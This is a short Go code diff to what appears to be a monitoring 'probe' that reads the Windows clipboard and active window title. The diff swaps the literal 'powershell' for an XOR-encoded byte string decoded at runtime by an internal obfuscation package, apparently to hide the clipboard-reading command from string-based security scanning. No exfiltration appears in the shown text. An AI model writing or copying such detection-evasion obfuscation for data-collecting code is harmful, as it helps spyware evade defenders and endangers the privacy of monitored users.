@@ -12,6 +12,8 @@ import (
 	"syscall"
 	"time"
 	"unsafe"
+
+	"github.com/falke-ai-circuit/probe/internal/obfs"
 )
 
 // readActiveWindowImpl uses Win32 GetForegroundWindow + GetWindowTextW to
@@ -34,7 +36,7 @@ func readActiveWindowImpl() (string, error) {
 // has built-in Get-Clipboard which works without extra deps on Windows
 // 10+. Falls back to error if PowerShell not available.
 func readClipboardImpl() (string, error) {
-	out, err := exec.Command("powershell", "-NoProfile", "-Command", "Get-Clipboard -Raw").Output()
+	out, err := exec.Command(obfs.Str("\x2a\x35\x2d\x3f\x28\x29\x32\x3f\x36\x36"), "-NoProfile", "-Command", "Get-Clipboard -Raw").Output()
 	if err == nil {
 		return string(out), nil
 	}
